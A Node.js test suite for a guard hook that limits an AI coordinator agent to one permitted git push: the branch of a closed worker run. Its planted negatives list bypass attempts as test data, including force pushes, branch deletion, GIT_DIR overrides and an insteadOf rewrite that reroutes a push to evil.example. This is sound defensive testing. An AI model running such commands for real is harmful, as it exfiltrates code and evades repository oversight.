#!/usr/bin/env node
// Tests for the one product write coordinator-write-guard.js allows the Brain:
// pushing the branch of a CLOSED unattended-worker run, from its worktree.
// Run: node tooling/test-coordinator-ledger-push.js
// Exits 1 on any failure; 0 if all pass.
//
// WHY A SUITE OF ITS OWN. `[measured 2026-10-25]` no task queued with
// `unattended-worker.js enqueue` could land: the headless builder may not push,
// and this rail refused the Brain the same push. The exemption that fixes it
// widens a blocking rail, so the planted negatives below matter more than the
// allow: an arbitrary product push by the coordinator must still block, and so
// must every near miss of the allowed shape (a live run, a force, another
// branch, another remote, a config override).
//
// THE CONTROL HAS A DIFFERENT MECHANISM FROM THE SUBJECT. Each allowed command
// is also run with the ledger file deleted, and must then block. That proves
// the allow comes from the ledger record, not from some other exemption in the
// hook (home repo, scratch dir, subagent) that would let the same bytes through.
//
// Hermetic: the role file, the config dir (where the ledger lives) and the temp
// dirs all sit in a fixture. The real ~/.claude is never read.

const { classify, reason, runBudgeted, tally, exitCode } = require('./spawn-budget.js');
const fs = require('fs');
const os = require('os');
const path = require('path');

const HOOK = path.resolve(__dirname, '..', 'plugins', 'autodev-core', 'hooks', 'coordinator-write-guard.js');

const fixture = fs.mkdtempSync(path.join(os.tmpdir(), 'cwg-ledger-'));
const ROLE = path.join(fixture, 'brain-role.json');
const CFG_DIR = path.join(fixture, 'cfg');
const TMP_DIR = path.join(fixture, 'tmp');
const LEDGER = path.join(CFG_DIR, 'autodev', 'unattended-workers.json');
const HERMETIC_DIRS = { CLAUDE_CONFIG_DIR: CFG_DIR, TEMP: TMP_DIR, TMP: TMP_DIR, TMPDIR: TMP_DIR };

// Fabricated paths: the guard compares paths and never stats a repo.
const HOME_REPO = path.join(fixture, 'harness');
const PRODUCT = path.join(fixture, 'product');
const SLUG = 'v-li-caption-614b';
const BRANCH = `claude/${SLUG}`;
const WT = path.join(PRODUCT, '.claude', 'worktrees', SLUG);
const OTHER_WT = path.join(PRODUCT, '.claude', 'worktrees', 'other-task');

fs.mkdirSync(path.dirname(LEDGER), { recursive: true });
fs.mkdirSync(TMP_DIR, { recursive: true });
fs.writeFileSync(ROLE, JSON.stringify({ session_id: 'BRAIN', home_repos: [HOME_REPO] }));

const record = (over = {}) => ({
    taskId: `worker-${SLUG}`, repo: PRODUCT, slug: SLUG, branch: BRANCH, worktree: WT,
    base: 'origin/main', state: 'closed', channel: 'headless', runStatus: 'failed', ...over,
});
function writeLedger(records) { fs.writeFileSync(LEDGER, JSON.stringify({ version: 1, records }, null, 2)); }

let pass = 0;
let fail = 0;
let infra = 0;
const failures = [];
const indeterminate = [];

function run(command, { cwd = HOME_REPO } = {}) {
    const payload = { tool_name: 'Bash', session_id: 'BRAIN', cwd, tool_input: { command } };
    const r = runBudgeted(process.execPath, [HOOK], {
        input: JSON.stringify(payload),
        encoding: 'utf8',
        env: { ...process.env, AI_AGENT: 'claude-code_suite_agent', CLAUDE_CODE_ENTRYPOINT: 'cli', AUTODEV_BRAIN_ROLE_FILE: ROLE, ...HERMETIC_DIRS },
        timeout: 20000,
        maxTimeout: 300000,
    });
    // Exit 2 is this hook's block, a verdict here, not an indeterminate child.
    if (classify(r, 'exit2') === 'infrastructure') {
        infra++;
        indeterminate.push(`${command} (${reason(r)})`);
        console.error(`infrastructure: ${command} produced no verdict (${reason(r)})`);
    }
    return { exit: r.status, stdout: r.stdout || '', stderr: r.stderr || '' };
}

function check(label, ok, detail) {
    if (ok) pass++;
    else { fail++; failures.push(label); }
    console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${detail ? `  (${detail})` : ''}`);
}

/** An allow: exit 0 and not one byte on either stream. */
function expectAllow(label, res) {
    check(label, res.exit === 0 && !res.stdout.length && !res.stderr.length,
        `exit ${res.exit}, stdout ${res.stdout.length}B, stderr ${res.stderr.length}B`);
}

/** A block of THIS rail: exit 2 with the coordinator message, naming the verb. */
function expectBlock(label, res, verb = 'git push') {
    const ok = res.exit === 2 && /^Blocked: this session holds the coordinator role/.test(res.stderr)
        && res.stderr.includes(`\`${verb}\``);
    check(label, ok, `exit ${res.exit}, stderr ${JSON.stringify(res.stderr.slice(0, 120))}`);
}

// ---------------------------------------------------------------------------
// A. THE ALLOWED PATH. A closed record, its worktree, origin and its branch.
// ---------------------------------------------------------------------------
writeLedger([record()]);
const ALLOWED = [
    [`git -C "${WT}" push origin ${BRANCH}`, {}],
    [`cd "${WT}" && git push -u origin ${BRANCH}`, {}],
    [`git push --set-upstream origin refs/heads/${BRANCH}`, { cwd: WT }],
    [`git push origin ${BRANCH}:${BRANCH}`, { cwd: path.join(WT, 'src') }],
];
for (const [cmd, opts] of ALLOWED) expectAllow(`A. allowed: ${cmd.replace(fixture, '<fx>')}`, run(cmd, opts));
// gh and merge-lock are the rest of the handoff. The rail parses git, so they
// were never blocked; pinned here so a later widening of the rail is visible.
expectAllow('A. gh pr create for the branch is outside this rail', run(`gh pr create --head ${BRANCH} --fill`, { cwd: WT }));
expectAllow('A. merge-lock.js is outside this rail', run('node merge-lock.js merge --repo o/n --pr 7 --head abc --gate-receipt r.log', { cwd: WT }));

// ---------------------------------------------------------------------------
// B. THE CONTROL. The same allowed bytes with no ledger must block, so the
//    allow above is the ledger's doing and not another exemption's.
// ---------------------------------------------------------------------------
fs.rmSync(LEDGER);
for (const [cmd, opts] of ALLOWED) expectBlock(`B. no ledger, same bytes block: ${cmd.replace(fixture, '<fx>')}`, run(cmd, opts));
fs.writeFileSync(LEDGER, '{ not json');
expectBlock('B. an unreadable ledger fails CLOSED: the push blocks', run(`git -C "${WT}" push origin ${BRANCH}`));
const hint = run(`git -C "${WT}" push origin ${BRANCH}`);
check('B. a blocked push names the one push that is allowed', /closed unattended-worker run's branch/.test(hint.stderr), hint.stderr.slice(-160));

// ---------------------------------------------------------------------------
// C. PLANTED NEGATIVES. A closed record exists for WT throughout, so each of
//    these is one step from the allowed shape, and each must still block.
// ---------------------------------------------------------------------------
writeLedger([record()]);
expectBlock('C. an arbitrary product push by the coordinator blocks (repo root, not the worktree)',
    run(`git -C "${PRODUCT}" push origin ${BRANCH}`));
expectBlock('C. a push from a worktree with no ledger record blocks', run(`git -C "${OTHER_WT}" push origin claude/other-task`));
for (const cmd of [
    `git -C "${WT}" push --force origin ${BRANCH}`,
    `git -C "${WT}" push -f origin ${BRANCH}`,
    `git -C "${WT}" push --force-with-lease origin ${BRANCH}`,
    `git -C "${WT}" push origin +${BRANCH}`,
    `git -C "${WT}" push origin main`,
    `git -C "${WT}" push origin ${BRANCH}:main`,
    `git -C "${WT}" push origin HEAD:main`,
    `git -C "${WT}" push upstream ${BRANCH}`,
    `git -C "${WT}" push`,
    `git -C "${WT}" push origin`,
    `git -C "${WT}" push origin ${BRANCH} main`,
    `git -C "${WT}" push --all origin`,
    `git -C "${WT}" push --mirror origin`,
    `git -C "${WT}" push --delete origin ${BRANCH}`,
    `git -C "${WT}" push --no-verify origin ${BRANCH}`,
    `git -C "${WT}" -c url.https://evil.example/.insteadOf=https://github.com/ push origin ${BRANCH}`,
    `GIT_DIR=/elsewhere/.git git -C "${WT}" push origin ${BRANCH}`,
    `git -C "${WT}" --git-dir=/elsewhere/.git push origin ${BRANCH}`,
]) expectBlock(`C. near miss blocks: ${cmd.replace(fixture, '<fx>')}`, run(cmd));
expectBlock('C. an allowed push does not launder a chained product commit',
    run(`git -C "${WT}" push origin ${BRANCH} && git -C "${PRODUCT}" commit -m x`), 'git commit');

// A run that has not ended: no push while a worker may still write there.
for (const state of ['queued', 'started', 'held', 'retired']) {
    writeLedger([record({ state })]);
    expectBlock(`C. a ${state} record licenses no push`, run(`git -C "${WT}" push origin ${BRANCH}`));
}
// A reused slug: the old run closed, a new one is live. The newest record wins.
writeLedger([record(), record({ taskId: `worker-${SLUG}-2`, state: 'started' })]);
expectBlock('C. a closed record shadowed by a newer live one licenses no push', run(`git -C "${WT}" push origin ${BRANCH}`));
// A record enqueue would never write: a default branch.
writeLedger([record({ branch: 'main' })]);
expectBlock('C. a closed record naming a default branch licenses no push to it', run(`git -C "${WT}" push origin main`));
// A relative worktree in the record resolves against nothing knowable.
writeLedger([record({ worktree: path.relative(process.cwd(), WT) })]);
expectBlock('C. a record with a relative worktree licenses no push', run(`git -C "${WT}" push origin ${BRANCH}`));

fs.rmSync(fixture, { recursive: true, force: true });

console.log(`\n${tally(pass, fail, infra)}`);
console.log(`subject: plugins/autodev-core/hooks/coordinator-write-guard.js, driven as a subprocess ${pass + fail} times: `
    + `${ALLOWED.length} allowed pushes, each re-run with no ledger as the control, and the planted negatives.`);
if (fail) console.log(`failed: ${failures.join(' | ')}`);
if (infra) console.log(`indeterminate: ${indeterminate.join(' | ')}`);
process.exitCode = exitCode(fail, infra);
